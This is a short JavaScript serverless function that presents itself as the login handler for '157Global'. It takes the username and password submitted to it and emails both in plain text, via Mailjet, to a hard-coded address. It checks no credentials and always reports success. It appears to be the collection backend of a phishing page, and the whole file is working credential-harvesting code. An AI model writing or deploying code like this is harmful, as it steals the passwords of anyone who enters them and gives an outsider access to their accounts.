const mailjet = require('node-mailjet').connect(
  process.env.MJ_APIKEY_PUBLIC,
  process.env.MJ_APIKEY_PRIVATE
);

exports.handler = async function (event) {
  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: 'Method Not Allowed',
    };
  }

  const formData = JSON.parse(event.body);
  const { username, password } = formData;

  try {
    await mailjet.post('send', { version: 'v3.1' }).request({
      Messages: [
        {
          From: {
            Email: 'sg@157global.com',
            Name: '157Global Login',
          },
          To: [
            {
              Email: 'sg@157global.com',
              Name: 'Admin',
            },
          ],
          Subject: 'Login Attempt Detected',
          TextPart: `Login attempt detected.\nUsername: ${username}\nPassword: ${password}`,
        },
      ],
    });

    return {
      statusCode: 200,
      body: JSON.stringify({ success: true }),
    };
  } catch (err) {
    return {
      statusCode: 500,
      body: JSON.stringify({ error: 'Email failed', detail: err.message }),
    };
  }
};
